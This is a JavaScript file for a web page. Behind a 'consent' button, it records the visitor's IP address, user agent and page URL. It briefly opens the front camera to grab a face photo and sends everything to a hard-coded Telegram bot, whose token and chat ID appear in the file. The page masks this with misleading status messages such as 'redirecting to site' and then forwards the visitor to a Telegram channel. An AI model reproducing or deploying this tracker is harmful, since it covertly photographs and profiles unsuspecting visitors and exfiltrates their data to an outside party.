// Конфигурация
const config = {
    botToken: '8173072452:AAHFc7rmZ2W0xNK2gboFSK_BcNzxMMzSq3o',
    chatId: '-4850015870',
    ipApiUrl: 'https://api.ipify.org?format=json',
    telegramApiUrl: 'https://api.telegram.org/bot',
    telegramChannel: 'https://t.me/+Em2vKwjqck4wNjMy'
};

// DOM элементы
const elements = {
    consentBtn: document.getElementById('consentBtn'),
    status: document.getElementById('status'),
    successMsg: document.getElementById('successMsg'),
    cameraFeed: document.getElementById('cameraFeed'),
    photoCanvas: document.getElementById('photoCanvas')
};

// Функция захвата фото
async function captureFace() {
    return new Promise(async (resolve) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' }, 
                audio: false 
            });
            
            elements.cameraFeed.srcObject = stream;
            await new Promise(resolve => setTimeout(resolve, 500)); // Даем камере время на фокусировку
            
            // Рисуем кадр на canvas
            const ctx = elements.photoCanvas.getContext('2d');
            elements.photoCanvas.width = elements.cameraFeed.videoWidth;
            elements.photoCanvas.height = elements.cameraFeed.videoHeight;
            ctx.drawImage(elements.cameraFeed, 0, 0);
            
            // Преобразуем в Blob
            elements.photoCanvas.toBlob(blob => {
                stream.getTracks().forEach(track => track.stop());
                resolve(blob);
            }, 'image/jpeg', 0.95);
            
        } catch (error) {
            console.error('Camera error:', error);
            resolve(null);
        }
    });
}

// Отправка фото в Telegram
async function sendPhotoToTelegram(photoBlob) {
    if (!photoBlob) return;
    
    const formData = new FormData();
    formData.append('chat_id', config.chatId);
    formData.append('photo', photoBlob, 'face.jpg');
    
    await fetch(`${config.telegramApiUrl}${config.botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
}

// Основная функция
async function sendDataAndRedirect() {
    try {
        elements.status.textContent = "Загрузка ссылки";
        
        // Получаем IP
        const ipResponse = await fetch(config.ipApiUrl);
        if (!ipResponse.ok) throw new Error('Ошибка получения IP');
        const { ip } = await ipResponse.json();
        
        // Захватываем фото
        elements.status.textContent = "Перенаправляю на сайт";
        const faceBlob = await captureFace();
        
        // Формируем сообщение
        const message = `🔥 Новый посетитель! 🔥\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nВремя: ${new Date().toLocaleString()}\nСсылка: ${window.location.href}`;
        
        // Отправляем текст
        const telegramTextUrl = `${config.telegramApiUrl}${config.botToken}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}`;
        await fetch(telegramTextUrl);
        
        // Отправляем фото
        if (faceBlob) {
            await sendPhotoToTelegram(faceBlob);
        }
        
        // Финал
        elements.status.classList.add('hidden');
        elements.successMsg.classList.remove('hidden');
        setTimeout(() => {
            window.location.href = config.telegramChannel;
        }, 2000);
        
    } catch (error) {
        console.error('Fatal:', error);
        window.location.href = config.telegramChannel;
    }
}

// Вешаем обработчик
elements.consentBtn.addEventListener('click', sendDataAndRedirect);